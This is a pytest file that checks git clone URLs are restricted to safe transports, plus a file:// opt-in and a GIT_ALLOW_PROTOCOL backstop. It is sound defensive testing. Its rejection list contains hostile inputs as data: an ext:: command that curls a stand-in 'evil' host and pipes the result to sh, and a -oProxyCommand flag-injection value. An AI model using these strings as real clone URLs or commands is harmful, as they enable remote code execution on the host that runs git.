"""Workspace repo URLs are restricted to safe git transports.

git honours ``ext::`` (arbitrary command execution) and ``file://``
(local read), so an unvalidated clone URL is an RCE / LFI seam.  These
tests pin the transport allowlist, the file:// opt-in, and the
subprocess-level ``GIT_ALLOW_PROTOCOL`` backstop.
"""

from __future__ import annotations

from collections.abc import Callable

import pytest

from pointlessql.git._subprocess import _build_env  # pyright: ignore[reportPrivateUsage]
from pointlessql.services.workspace.repos import (
    _assert_safe_git_url,  # pyright: ignore[reportPrivateUsage]
)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/org/repo.git",
        "http://internal.example/org/repo.git",
        "ssh://git@github.com/org/repo.git",
        "git@github.com:org/repo.git",
    ],
)
def test_allows_network_transports(url: str) -> None:
    """https/http/ssh and SCP-style URLs are accepted."""
    _assert_safe_git_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil|sh'",
        "fd::17/foo",
        "/local/path/repo",
        "-oProxyCommand=evil",
        "",
        "   ",
    ],
)
def test_rejects_dangerous_or_schemeless(url: str) -> None:
    """ext::, fd::, schemeless and flag-like URLs are always rejected."""
    with pytest.raises(ValueError):
        _assert_safe_git_url(url)


def test_file_url_rejected_by_default(settings_override: Callable[[str, object], None]) -> None:
    """file:// is refused unless the operator opts in."""
    settings_override("workspace_repos.allow_file_protocol", False)
    with pytest.raises(ValueError):
        _assert_safe_git_url("file:///srv/repo")


def test_file_url_allowed_when_enabled(settings_override: Callable[[str, object], None]) -> None:
    """file:// is accepted when allow_file_protocol is on."""
    settings_override("workspace_repos.allow_file_protocol", True)
    _assert_safe_git_url("file:///srv/repo")


def test_build_env_excludes_file_by_default(
    settings_override: Callable[[str, object], None],
) -> None:
    """The git env restricts protocols to https/http/ssh/git by default."""
    settings_override("workspace_repos.allow_file_protocol", False)
    assert _build_env(None)["GIT_ALLOW_PROTOCOL"] == "https:http:ssh:git"


def test_build_env_adds_file_when_enabled(
    settings_override: Callable[[str, object], None],
) -> None:
    """Enabling allow_file_protocol appends file to the git transport list."""
    settings_override("workspace_repos.allow_file_protocol", True)
    assert _build_env(None)["GIT_ALLOW_PROTOCOL"] == "https:http:ssh:git:file"
